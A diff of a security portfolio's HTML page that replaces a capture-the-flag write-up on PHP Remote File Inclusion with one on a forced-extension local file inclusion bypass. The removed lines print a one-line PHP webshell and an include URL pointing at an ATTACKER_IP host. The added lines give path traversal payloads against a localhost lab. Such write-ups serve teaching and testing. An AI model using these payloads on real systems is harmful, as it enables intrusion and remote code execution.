@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lab 5 — Real RFI — Mostafa Elwaseef's Portfolio</title>
+  <title>Level 3 — Forced Extension Bypass — Mostafa Elwaseef's Portfolio</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
   <style>
@@ -99,16 +99,16 @@
 <body>
 <nav>
   <span class="nav-logo">Waseef</span>
-  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+  <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
 </nav>
 
 <div class="hero">
   <div class="hero-inner">
-    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#labs">Labs</a> / <a href="index.html">Custom Lab</a> / Lab 5 — Real RFI</div>
-    <h1>Lab 5 — Real RFI</h1>
+    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#customlab">Custom Lab</a> / Level 3 — Forced Extension Bypass</div>
+    <h1>Level 3 — Forced Extension Bypass</h1>
     <div class="meta-row">
-      <span class="badge badge-hard">🔴 Critical</span>
-      <span class="badge badge-date">📅 2026-07-23</span>
+      <span class="badge badge-hard">🔴 High</span>
+      <span class="badge badge-date">📅 2026-07-21</span>
     </div>
   </div>
 </div>
@@ -118,77 +118,65 @@
 <div class='table-wrap'><table>
   <tr><th>Field</th><th>Value</th></tr>
   <tr><td><strong>Type</strong></td><td>Web App</td></tr>
-  <tr><td><strong>Severity</strong></td><td>🔴 Critical</td></tr>
-  <tr><td><strong>CVE / CWE</strong></td><td>CWE-98, CWE-73</td></tr>
-  <tr><td><strong>Date</strong></td><td>2026-07-23</td></tr>
+  <tr><td><strong>Severity</strong></td><td>🔴 High</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-98, CWE-22, CWE-209</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-07-21</td></tr>
 </table></div>
 <hr>
 <h2 id="description">🔍 Description</h2>
-<p>Level 5 presents a PHP application that passes user-supplied input directly into an <code>include()</code> statement without any filtering or sanitization. Unlike Local File Inclusion, this instance has <code>allow_url_include=On</code> set in <code>php.ini</code>, which instructs PHP’s <code>include()</code> to accept remote HTTP URLs in addition to local file paths. By supplying a URL pointing to an attacker-controlled server as the <code>page</code> parameter, the victim PHP engine fetches and executes the remote file as PHP code. Hosting a simple webshell at that URL gives the attacker full Remote Code Execution on the web server.</p>
+<p>The application appends a hardcoded <code>.php</code> extension to every value supplied via the <code>page</code> parameter before passing it to PHP’s <code>include()</code>. The intent is to prevent inclusion of arbitrary file types — an attacker submitting <code>../../../../etc/passwd</code> receives <code>includes/../../../../etc/passwd.php</code>, which does not exist. However, this defense backfires when the target file itself has a <code>.php</code> extension: the forced suffix becomes a match rather than a blocker. The flag was stored as <code>flag3.php</code>, so the payload <code>../flags/flag3</code> resolves to <code>../flags/flag3.php</code> and is included successfully. Additionally, the application leaks its full server path through PHP error messages, giving an attacker precise information about the web root before any bypass attempt.</p>
 <hr>
 <h2 id="end-goals">🎯 End Goals</h2>
 <ul>
-  <li>Confirm the application is vulnerable to Remote File Inclusion (not just LFI)</li>
-  <li>Host a PHP webshell on an attacker-controlled HTTP server</li>
-  <li>Include the remote webshell via the vulnerable <code>page</code> parameter to achieve RCE</li>
-  <li>Retrieve the flag from <code>/var/www/html/flags/flag5.txt</code></li>
+  <li>Identify that <code>.php</code> is always appended to the user-supplied filename</li>
+  <li>Confirm the application leaks its server path through error disclosure</li>
+  <li>Recognize that the forced extension becomes an advantage when the target file is itself a <code>.php</code> file</li>
+  <li>Include <code>flags/flag3.php</code> via <code>../flags/flag3</code> to capture the flag</li>
 </ul>
 <hr>
 <h2 id="steps-to-reproduce">🪜 Steps to Reproduce</h2>
 <ol>
-  <li>Identify the <code>page</code> parameter in <code>level5.php</code> as a potential file inclusion point.</li>
-  <li>Confirm RFI by supplying a remote URL as the <code>page</code> value and observing a connection error rather than a local file error — this proves <code>allow_url_include=On</code>.</li>
-  <li>Create a PHP webshell on the attacker machine.</li>
-  <li>Start an HTTP server to serve the webshell, then trigger it via the vulnerable parameter to confirm RCE.</li>
-  <li>Locate the flag file using the RCE webshell.</li>
-  <li>Retrieve the flag.</li>
+  <li>Navigate to the target and observe the <code>page</code> parameter and <code>Loading:</code> path in the response</li>
+  <li>Submit an absolute path probe to trigger a PHP error and confirm the web root and forced <code>.php</code> extension</li>
+  <li>Verify LFI works on <code>.php</code> targets by self-including the level page</li>
+  <li>Apply the insight to <code>../flags/flag3</code> — the app appends <code>.php</code>, which resolves <code>flag3.php</code> and returns the flag</li>
 </ol>
 <hr>
 <h2 id="analysis">🧠 Analysis</h2>
-<p><strong>Step 1 — Identify potential file inclusion vulnerability</strong></p>
-<p>Navigating to <code>level5.php</code> with the default <code>page=welcome.txt</code> parameter shows “Loading: includes/welcome.txt”, the same structure as previous labs. This indicates the <code>page</code> parameter is passed directly to PHP’s <code>include()</code> function and is a candidate for file inclusion exploitation.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280989e7eff2d42f18f18.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 1 — Observe the application</strong></p>
+<p>Navigating to <code>http://localhost:8080/level3.php</code> shows the familiar page-navigation interface. The default <code>page=welcome</code> loads with <code>Loading: includes/welcome.php</code> visible in the response — the application is explicitly appending <code>.php</code> to every parameter value. A hint in the page notes that null-byte truncation (<code>%00</code>) was patched in PHP 5.3.4 and will not work here.</p>
+<blockquote>  <figure><img src="images/level-3-forced-extension-bypass/3a4b752371728087a089d5eaed8f7ced.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 2 — Verify RFI capability</strong></p>
-<p>Before exploiting, the vulnerability type must be confirmed. Passing a remote URL — <code>page=http://&lt;ATTACKER_IP&gt;:9999/shell.php</code> — to the <code>page</code> parameter returns the error <code>failed to open stream: Connection refused</code>. This is the critical distinction: a local file error would say “No such file or directory”, whereas “Connection refused” means PHP actually attempted an outbound HTTP request to the attacker’s server. This proves <code>allow_url_include=On</code> is set in <code>php.ini</code> and confirms the application is vulnerable to RFI, not just LFI.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280999e4befc621c1d7a4.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 2 — Error disclosure confirms web root and forced extension</strong></p>
+<p>Submitting <code>page=/etc/passwd</code> triggered a PHP <code>include()</code> error. The <code>Loading:</code> line showed <code>includes//etc/passwd.php</code> — the <code>.php</code> suffix appended to <code>/etc/passwd</code> confirms the forced-extension behavior. More importantly, the PHP error message disclosed the full server path: <code>/var/www/html/level3.php</code>, establishing the web root as <code>/var/www/html/</code>. An attacker now knows both the directory layout and exactly why standard traversal to arbitrary file types will fail.</p>
+<blockquote>  <figure><img src="images/level-3-forced-extension-bypass/3a4b7523717280f2afbefa8e355a5224.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 3 — Create the PHP webshell</strong></p>
-<p>A minimal one-liner webshell is written to <code>shell.php</code> on the attacker machine: <code>&lt;?php system($_GET["cmd"]); ?&gt;</code>. This file accepts an OS command via the <code>cmd</code> query parameter and executes it using PHP’s <code>system()</code> function. The victim PHP engine will fetch and evaluate this file — the attacker's own server only needs to serve the raw text, not execute it.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b752371728044a548f340bdfd1508.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 3 — Self-inclusion confirms LFI works on </strong><strong><code>.php</code></strong><strong> files</strong></p>
+<p>To verify that the forced extension is an advantage rather than a blocker when the target is a PHP file, the payload <code>../level3</code> was submitted. The app appended <code>.php</code>, producing <code>Loading: includes/../level3.php</code>, which resolves to <code>level3.php</code> itself. The page rendered recursively — Level 3 including itself — confirming that LFI is fully functional as long as the target file carries a <code>.php</code> extension.</p>
+<blockquote>  <figure><img src="images/level-3-forced-extension-bypass/3a4b752371728020a70be9f175825c6b.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
-<p><strong>Step 4 — Serve the webshell and confirm RCE</strong></p>
-<p>A Python HTTP server is started with <code>python3 -m http.server 9999</code>, making <code>shell.php</code> accessible at <code>http://&lt;ATTACKER_IP&gt;:9999/shell.php</code>. The webshell is then triggered by requesting <code>page=http://&lt;ATTACKER_IP&gt;:9999/shell.php&amp;cmd=id</code>. The victim PHP engine fetches <code>shell.php</code>, executes it, and returns <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code> in the response, confirming full RCE as the <code>www-data</code> user.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280c0965adc4c557f160a.png" alt="screenshot" loading="lazy"></figure>
-  <figure><img src="images/lab-5-real-rfi/3a6b75237172802f8a68f121ed422419.png" alt="screenshot" loading="lazy"></figure>
-</blockquote>
-<hr>
-<p><strong>Step 5 — Locate the flag</strong></p>
-<p>With RCE confirmed, the command <code>find / -name flag5.txt 2&gt;/dev/null</code> is passed via <code>curl</code> by appending <code>&amp;cmd=find+/-name+flag5.txt+2&gt;/dev/null</code> to the RFI URL. The output reveals the flag at <code>/var/www/html/flags/flag5.txt</code>.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b752371728017b69dca8e001d2cd1.png" alt="screenshot" loading="lazy"></figure>
-</blockquote>
-<hr>
-<p><strong>Step 6 — Retrieve the flag</strong></p>
-<p>Navigating to the RFI URL in the browser with <code>cmd=cat+/var/www/html/flags/flag5.txt</code> executes the command and renders the output inline: <strong><code>FLAG{lvl5_real_rfi_remote_shell}</code></strong>.</p>
-<blockquote>  <figure><img src="images/lab-5-real-rfi/3a6b7523717280fa910bc17994f5ceb7.png" alt="screenshot" loading="lazy"></figure>
+<p><strong>Step 4 — Retrieve the flag</strong></p>
+<p>With the mechanism understood, the payload <code>../flags/flag3</code> was submitted. The application appended <code>.php</code>, resolving to <code>Loading: includes/../flags/flag3.php</code> — pointing to <code>/var/www/html/flags/flag3.php</code>. The file was included and the flag returned: <strong><code>FLAG{lvl3_wrapper_bypass_forced_extension}</code></strong></p>
+<blockquote>  <figure><img src="images/level-3-forced-extension-bypass/3a4b75237172803d9456ef4716d30a92.png" alt="screenshot" loading="lazy"></figure>
 </blockquote>
 <hr>
 <h2 id="impact">🎯 Impact</h2>
-<p>An attacker who identifies <code>allow_url_include=On</code> can achieve full Remote Code Execution on the web server as the <code>www-data</code> user with no authentication required. This allows reading of arbitrary files, exfiltration of sensitive data, modification of web application files, and potential lateral movement within the server or internal network. RFI is generally considered more severe than LFI because it does not require any prior access to the target filesystem — the attacker supplies the payload entirely from their own infrastructure.</p>
+<p>The forced-extension defense creates a false sense of security. It prevents reading non-PHP files (configuration files, <code>/etc/passwd</code>, text files) but leaves any <code>.php</code> file on the server fully readable via LFI. In a real application this means source code disclosure, exposure of files containing credentials or business logic, and potential for chained attacks. Combined with the PHP error-disclosure that leaks the web root, an attacker can enumerate the directory structure and target PHP files with high precision before making a single exploit attempt.</p>
 <hr>
 <h2 id="references">📚 References</h2>
 <ul>
-  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank" rel="noopener">OWASP: Testing for Remote File Inclusion</a></li>
-  <li><a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank" rel="noopener">CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program</a></li>
-  <li><a href="https://cwe.mitre.org/data/definitions/73.html" target="_blank" rel="noopener">CWE-73: External Control of File Name or Path</a></li>
-  <li><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi-remote-file-inclusion" target="_blank" rel="noopener">Remote File Inclusion — HackTricks</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank" rel="noopener">CWE-98: Improper Control of Filename for Include/Require Statement in PHP</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/209.html" target="_blank" rel="noopener">CWE-209: Generation of Error Message Containing Sensitive Information</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank" rel="noopener">OWASP Testing Guide — Local File Inclusion</a></li>
 </ul>
+<hr>
 
 </div>
 
-<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+<footer>Built by Waseef · <a href="../../index.html">Back to Portfolio</a></footer>
 </body>
 </html>
